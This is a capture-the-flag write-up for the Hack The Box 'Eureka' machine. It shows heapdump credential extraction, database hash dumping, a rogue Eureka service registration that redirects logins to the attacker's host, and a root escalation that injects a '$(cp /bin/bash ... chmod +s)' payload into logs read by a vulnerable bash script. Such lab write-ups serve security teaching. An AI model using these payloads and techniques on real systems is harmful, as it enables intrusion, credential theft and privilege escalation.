# HTB Writeup – Eureka

![eureka](./img/eureka.jpg)

# RECON

## Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Dirsearch

```sh
$ dirsearch -u http://furni.htb/ -x 399-499

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12266

Target: http://furni.htb/

[20:22:04] Scanning:
[20:22:49] 200 -   14KB - /about
[20:22:51] 200 -    2KB - /actuator
[20:22:52] 200 -    20B - /actuator/caches
[20:22:53] 200 -     2B - /actuator/info
[20:22:53] 200 -   467B - /actuator/features
[20:22:53] 200 -    6KB - /actuator/env
[20:22:53] 200 -    15B - /actuator/health
[20:22:53] 200 -    3KB - /actuator/metrics
[20:22:53] 200 -    54B - /actuator/scheduledtasks
[20:22:53] 200 -   35KB - /actuator/mappings
[20:22:53] 200 -   36KB - /actuator/configprops
[20:22:53] 200 -   99KB - /actuator/loggers
[20:22:52] 200 -  180KB - /actuator/conditions
[20:22:52] 200 -  198KB - /actuator/beans
[20:22:53] 200 -  211KB - /actuator/threaddump
[20:22:53] 200 -   76MB - /actuator/heapdump
[20:23:26] 200 -   13KB - /blog
[20:23:27] 302 -     0B - /cart  ->  http://furni.htb/login
[20:23:29] 302 -     0B - /checkout  ->  http://furni.htb/login
[20:23:32] 302 -     0B - /comment  ->  http://furni.htb/login
[20:23:36] 200 -   10KB - /contact
[20:23:48] 500 -    73B - /error
[20:24:14] 200 -    2KB - /login
[20:24:16] 200 -    1KB - /logout
[20:24:46] 200 -    9KB - /register
[20:24:53] 200 -   14KB - /services
[20:24:54] 200 -   12KB - /shop
```

Look endpoints **/actuator**

* `/env`
* `/heapdump`
* `/mappings`
* `/beans`
* `/loggers`
* `/heapdump`

# WEB

### Enum Endpoints

#### Env

* **/actuator/env**

```json
{
  "name": "Config resource 'file [/var/www/web/Furni/src/main/resources/application.properties]' via location '/var/www/web/Furni/src/main/resources/application.properties'",
  "properties": {
    "spring.application.name": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 1:25"
    },
    "spring.session.store-type": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 2:27"
    },
    "spring.cloud.inetutils.ignoredInterfaces": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 3:42"
    },
    "spring.cloud.client.hostname": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 4:30"
    },
    "eureka.client.service-url.defaultZone": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 6:40"
    },
    "eureka.instance.hostname": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 7:26"
    },
    "eureka.instance.prefer-ip-address": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 8:35"
    },
    "spring.jpa.hibernate.ddl-auto": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 10:31"
    },
    "spring.datasource.url": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 11:23"
    },
    "spring.datasource.username": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 12:28"
    },
    "spring.datasource.password": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 13:28"
    },
    "spring.datasource.driver-class-name": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 14:37"
    },
    "spring.jpa.properties.hibernate.format_sql": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 15:44"
    },
    "server.address": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 17:16"
    },
    "server.port": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 18:13"
    },
    "server.forward-headers-strategy": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 20:33"
    },
    "management.endpoints.web.exposure.include": {
      "value": "******",
      "origin": "URL [file:/var/www/web/Furni/src/main/resources/application.properties] - 22:43"
    }
  }
}
```

#### Feature

* **/actuator/feature**

```json
{
  "enabled": [
    {
      "type": "com.netflix.discovery.EurekaClient",
      "name": "Eureka Client",
      "version": "2.0.3",
      "vendor": null
    },
    {
      "type": "org.springframework.cloud.client.discovery.composite.CompositeDiscoveryClient",
      "name": "DiscoveryClient",
      "version": "4.1.4",
      "vendor": "Pivotal Software, Inc."
    },
    {
      "type": "org.springframework.cloud.loadbalancer.blocking.client.BlockingLoadBalancerClient",
      "name": "LoadBalancerClient",
      "version": "4.1.4",
      "vendor": "Pivotal Software, Inc."
    }
  ],
  "disabled": []
}
```

#### Heapdump

* **/active/heapdump**

```sh
$ curl -O http://furni.htb/actuator/heapdump

$ file heapdump
heapdump: Java HPROF dump, created Thu Aug  1 18:29:32 2024
```

To crack it open, unleash [**JDumpSpider**](https://github.com/whwlsfb/JDumpSpider):

```sh
$ java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump.hprof

===========================================
SpringDataSourceProperties
-------------
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190

===========================================
WeblogicDataSourceConnectionPoolConfig
-------------
not found!

===========================================
MongoClient
-------------
not found!

===========================================
AliDruidDataSourceWrapper
-------------
not found!

===========================================
HikariDataSource
-------------
java.lang.NumberFormatException: Cannot parse null string
not found!

===========================================
RedisStandaloneConfiguration
-------------
not found!

===========================================
JedisClient
-------------
not found!

===========================================
CookieRememberMeManager(ShiroKey)
-------------
not found!

===========================================
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc
spring.jpa.hibernate.ddl-auto = none

===========================================
MutablePropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
local.server.port = null
spring.cloud.client.hostname = eureka

===========================================
MapPropertySources
-------------
spring.cloud.client.ip-address = 127.0.0.1
spring.cloud.client.hostname = eureka
local.server.port = null

===========================================
ConsulPropertySources
-------------
not found!

===========================================
JavaProperties
-------------
not found!

===========================================
ProcessEnvironment
-------------
not found!

===========================================
OSS
-------------
not found!

===========================================
UserPassSearcher
-------------
org.springframework.security.web.authentication.ui.DefaultLoginPageGeneratingFilter:
[oauth2LoginEnabled = false, passwordParameter = password, formLoginEnabled = true, usernameParameter = username, loginPageUrl = /login, authenticationUrl = /login, saml2LoginEnabled = false, failureUrl = /login?error]
[oauth2LoginEnabled = false, formLoginEnabled = false, saml2LoginEnabled = false]

org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter:
[passwordParameter = password, usernameParameter = username]

org.antlr.v4.runtime.atn.LexerATNConfig:
[passedThroughNonGreedyDecision = false]

org.antlr.v4.runtime.atn.ATNDeserializationOptions:
[generateRuleBypassTransitions = false]

org.hibernate.boot.internal.InFlightMetadataCollectorImpl:
[inSecondPass = false]

com.mysql.cj.protocol.a.authentication.AuthenticationLdapSaslClientPlugin:
[firstPass = true]

com.mysql.cj.protocol.a.authentication.CachingSha2PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.protocol.a.authentication.Sha256PasswordPlugin:
[publicKeyRequested = false]

com.mysql.cj.NativeCharsetSettings:
[platformDbCharsetMatches = true]

com.mysql.cj.protocol.a.NativeAuthenticationProvider:
[database = Furni_WebApp_DB, useConnectWithDb = true, serverDefaultAuthenticationPluginName = mysql_native_password, username = oscar190]

com.mysql.cj.jdbc.ConnectionImpl:
[password = 0sc@r190_S0l!dP@sswd, database = Furni_WebApp_DB, origHostToConnectTo = localhost, user = oscar190]

com.mysql.cj.conf.HostInfo:
[password = 0sc@r190_S0l!dP@sswd, host = localhost, user = oscar190]

com.zaxxer.hikari.pool.HikariPool:
[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]

org.springframework.cloud.netflix.eureka.EurekaClientConfigBean:
[eurekaServerConnectTimeoutSeconds = 5, useDnsForFetchingServiceUrls = false, eurekaServerReadTimeoutSeconds = 8, eurekaServerTotalConnections = 200, eurekaServiceUrlPollIntervalSeconds = 300, eurekaServerTotalConnectionsPerHost = 50]

org.springframework.boot.autoconfigure.security.SecurityProperties$User:
[password = 4312eecb-54e8-46b9-a645-5b9df3ea21d8, passwordGenerated = true]

org.springframework.boot.autoconfigure.jdbc.DataSourceProperties:
[password = 0sc@r190_S0l!dP@sswd, url = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]

org.springframework.security.authentication.dao.DaoAuthenticationProvider:
[hideUserNotFoundExceptions = true]

com.zaxxer.hikari.HikariDataSource:
[password = 0sc@r190_S0l!dP@sswd, jdbcUrl = jdbc:mysql://localhost:3306/Furni_WebApp_DB, username = oscar190]

org.apache.catalina.startup.Tomcat:
[hostname = localhost]
```


## MySQL

```sh
oscar190@eureka:~$ mysql -uoscar190 -p
Enter password:

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 116
Server version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| Furni_WebApp_DB    |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use Furni_WebApp_DB;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [Furni_WebApp_DB]> show tables;
+---------------------------+
| Tables_in_Furni_WebApp_DB |
+---------------------------+
| SPRING_SESSION            |
| SPRING_SESSION_ATTRIBUTES |
| blogs                     |
| cart                      |
| cart_items                |
| cart_product              |
| cart_product_seq          |
| cart_seq                  |
| carts                     |
| category                  |
| category_seq              |
| comment                   |
| customer                  |
| customer_seq              |
| furniture                 |
| product                   |
| product_id                |
| product_seq               |
| users                     |
+---------------------------+
19 rows in set (0.001 sec)

MariaDB [Furni_WebApp_DB]> select * from users;
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
| id | first_name | last_name | email                   | password                                                     | is_staff |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
|  2 | Kamel      | Mossab    | [[email protected]](/cdn-cgi/l/email-protection) | $2a$10$J4yap5ZxviliZO9jBCuSdeD.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |
|  4 | Lorra      | Barker    | [[email protected]](/cdn-cgi/l/email-protection)      | $2a$10$DgUDWpxipW2Yt7UcKxzvweB7FXoV/LFxlJG8yuL56NyUMMLr5uBuK |        0 |
|  5 | Martin     | Wood      | [[email protected]](/cdn-cgi/l/email-protection)         | $2a$10$3LDYl5QEt4K4u8vLWMGH8eDA/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |
|  8 | Roberto    | Dalton    | [[email protected]](/cdn-cgi/l/email-protection)  | $2a$10$4TLCSlEfYrNDFfPDQ5z4p.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |
|  9 | Miranda    | Wise      | [[email protected]](/cdn-cgi/l/email-protection)  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |
| 10 | Oscar      | Dalton    | [[email protected]](/cdn-cgi/l/email-protection)      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |
| 11 | Nya        | Dalton    | [[email protected]](/cdn-cgi/l/email-protection)        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |
| 12 | lucas      | carols    | [[email protected]](/cdn-cgi/l/email-protection)   | $2a$10$J93xmU0.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
8 rows in set (0.001 sec)
```

## Internal Enum

```sh
oscar190@eureka:/var/www/web/cloud-gateway/src/main/resources$ ll /home
total 16
drwxr-xr-x  4 root         root         4096 Aug  9  2024 ./
drwxr-xr-x 19 root         root         4096 Apr 22 12:47 ../
drwxr-x---  8 miranda-wise miranda-wise 4096 Mar 21 13:26 miranda-wise/
drwxr-x---  5 oscar190     oscar190     4096 Apr  1 12:57 oscar190/

oscar190@eureka:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
mysql:x:115:119:MySQL Server,,,:/nonexistent:/bin/false
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Valid user **`miranda-wise`** found.

**Web root** exposure:

```sh
oscar190@eureka:~$ ls /var/www -l

total 8
drwxr-xr-x 2 root     root       4096 Apr 10 07:27 html
drwxrwxr-x 7 www-data developers 4096 Mar 18 21:19 web
```

Drilling into `/var/www/web/cloud-gateway/src/main/resources`, jackpot a configuration file **`application.yaml`**:

```yaml
eureka:
  instance:
    hostname: localhost
    prefer-ip-address: false
  client:
    registry-fetch-interval-seconds: 20
    service-url:
      defaultZone: http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/

spring:
  cloud:
    client:
      hostname: localhost
    gateway:
      routes:
        - id: user-management-service
          uri: lb://USER-MANAGEMENT-SERVICE
          predicates:
            - Path=/login,/logout,/register,/process_register
        - id: furni
          uri: lb://FURNI
          predicates:
            - Path=/**

  application:
    name: app-gateway

server:
  port: 8080
  address: 127.0.0.1

management:
  tracing:
    sampling:
      probability: 1

logging:
  level:
    root: INFO
  file:
    name: log/application.log
    path: ./
```

## Eureka

[Eureka](https://github.com/Netflix/eureka), is a **Service Discovery Server** developed by **Netflix**, later integrated into **Spring Cloud Netflix** for microservices – It acts like a **"yellow pages"** for microservices inside a distributed system.

#### 1. Get the registration info for the real service

```sh
curl -u 'EurekaSrvr:0scarPWDisTheB3st@http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE'
```

* `USER-MANAGEMENT-SERVICE`:


```xml
<application>
  <name>USER-MANAGEMENT-SERVICE</name>
  <instance>
    <instanceId>localhost:USER-MANAGEMENT-SERVICE:8081</instanceId>
    <hostName>localhost</hostName>
    <app>USER-MANAGEMENT-SERVICE</app>
    <ipAddr>10.129.▒▒.▒▒</ipAddr>
    <status>UP</status>
    <overriddenstatus>UNKNOWN</overriddenstatus>
    <port enabled="true">8081</port>
    <securePort enabled="false">443</securePort>
    <countryId>1</countryId>
    <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
      <name>MyOwn</name>
    </dataCenterInfo>
    <leaseInfo>
      <renewalIntervalInSecs>30</renewalIntervalInSecs>
      <durationInSecs>90</durationInSecs>
      <registrationTimestamp>1745499547869</registrationTimestamp>
      <lastRenewalTimestamp>1745741209415</lastRenewalTimestamp>
      <evictionTimestamp>0</evictionTimestamp>
      <serviceUpTimestamp>1745499547869</serviceUpTimestamp>
    </leaseInfo>
    <metadata>
      <management.port>8081</management.port>
    </metadata>
    <homePageUrl>http://localhost:8081/</homePageUrl>
    <statusPageUrl>http://localhost:8081/actuator/info</statusPageUrl>
    <healthCheckUrl>http://localhost:8081/actuator/health</healthCheckUrl>
    <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
    <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
    <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
    <lastUpdatedTimestamp>1745499547869</lastUpdatedTimestamp>
    <lastDirtyTimestamp>1745499547192</lastDirtyTimestamp>
    <actionType>ADDED</actionType>
  </instance>
</application>
```

#### 2. Create malicious XML

payload.xml
```xml
<instance>
  <instanceId>happy-middle-man</instanceId>
  <hostName>10.10.14.140</hostName>
  <app>USER-MANAGEMENT-SERVICE</app>
  <ipAddr>10.10.14.140</ipAddr>
  <status>UP</status>
  <overriddenstatus>UNKNOWN</overriddenstatus>
  <port enabled="true">4444</port>
  <securePort enabled="false">443</securePort>
  <countryId>1</countryId>
  <dataCenterInfo class="com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo">
    <name>MyOwn</name>
  </dataCenterInfo>
  <leaseInfo>
    <renewalIntervalInSecs>30</renewalIntervalInSecs>
    <durationInSecs>90</durationInSecs>
    <registrationTimestamp>1745499547869</registrationTimestamp>
    <lastRenewalTimestamp>1745741209415</lastRenewalTimestamp>
    <evictionTimestamp>0</evictionTimestamp>
    <serviceUpTimestamp>1745499547869</serviceUpTimestamp>
  </leaseInfo>
  <metadata>
    <management.port>4444</management.port>
  </metadata>
  <homePageUrl>http://10.10.14.140:4444/</homePageUrl>
  <statusPageUrl>http://10.10.14.140:4444/actuator/info</statusPageUrl>
  <healthCheckUrl>http://10.10.14.140:4444/actuator/health</healthCheckUrl>
  <vipAddress>USER-MANAGEMENT-SERVICE</vipAddress>
  <secureVipAddress>USER-MANAGEMENT-SERVICE</secureVipAddress>
  <isCoordinatingDiscoveryServer>false</isCoordinatingDiscoveryServer>
  <lastUpdatedTimestamp>1745499547869</lastUpdatedTimestamp>
  <lastDirtyTimestamp>1745499547192</lastDirtyTimestamp>
  <actionType>ADDED</actionType>
</instance>
```

#### 3. Register fake instance

POST our modified `payload.xml` back into Eureka:

Bash
```
curl -i -u 'EurekaSrvr:0scarPWDisTheB3st' \
     -H "Content-Type: application/xml" \
     -d @payload.xml \
     -X POST http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
```

#### 4. Launch a listener

 Credentials for miranda-wise `IL!veT0Be&BeT0L0ve`.

# USER

## Password Reuse

Login and get user flag.
`miranda-wise:IL!veT0Be&BeT0L0ve`

# ROOT

## Local Enum

No sudo:

```sh
miranda-wise@eureka:/dev/shm$ sudo -l

[sudo] password for miranda-wise:
Sorry, user miranda-wise may not run sudo on localhost.
```

Linpeas

```sh
╔══════════╣ Modified interesting files in the last 5mins (limit 100)

/var/log/journal/05275fe65ca74999b42379fe4b17d273/system@c4d33b84ac324922a1dbe5e9e12d424f-000000000019ddb1-000633c0adb53143.journal
/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1001.journal
/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1001@53a7e125097f4490b11ad9917c66d73d-000000000019f86b-000633c0f076f58a.journal
/var/log/journal/05275fe65ca74999b42379fe4b17d273/user-1000.journal
/var/log/journal/05275fe65ca74999b42379fe4b17d273/system.journal
/var/log/laurel/audit.log.5
/var/log/laurel/audit.log.3
/var/log/laurel/audit.log.2
/var/log/laurel/audit.log.1
/var/log/laurel/audit.log
/var/log/laurel/audit.log.4
/var/log/auth.log
/var/log/syslog
/var/log/kern.log
/var/www/web/cloud-gateway/log/application.log
/var/www/web/user-management-service/log/application.log
```

 **`application.log`**

```
╔══════════╣ Unexpected in /opt (usually empty)

total 24
drwxr-xr-x  4 root root     4096 Mar 20 14:17 .
drwxr-xr-x 19 root root     4096 Apr 22 12:47 ..
drwxrwx---  2 root www-data 4096 Aug  7  2024 heapdump
-rwxrwxr-x  1 root root     4980 Mar 20 14:17 log_analyse.sh
drwxr-x---  2 root root     4096 Apr  9 18:34 scripts
```

## Code Reivew

```sh
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi

analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}

analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}

analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}

display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))

        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi

        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}

# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```


Vulnerability in **`analyze_http_statuses()`** function:

```sh
grep "HTTP.*Status: " "$LOG_FILE" | while read line; do
    code=$(echo "$line" | grep -oP 'Status: \K.*')
```

Then **code is interpreted** in:

```sh
if [[ "$existing_code" -eq "$code" ]]; then
```

* `-eq` is a **numeric comparison**.
* If `$code` is **NOT a number**, bash will **evaluate** it.
* If `$code` is something like `a[$(id)]`, then bash **will expand the `$(...)` before comparison**.

## Privesc

```sh
#!/bin/bash

PAYLOAD='HTTPStatus: a[$(cp /bin/bash /tmp/pwnme && chmod +s /tmp/pwnme)]'

for log in /var/www/web/*/log/application.log; do
    echo "[+] Replacing $log"
    echo "$PAYLOAD" > "$log"
done

echo "[+] Done. Wait for cron to escalate."
```


Rooted.
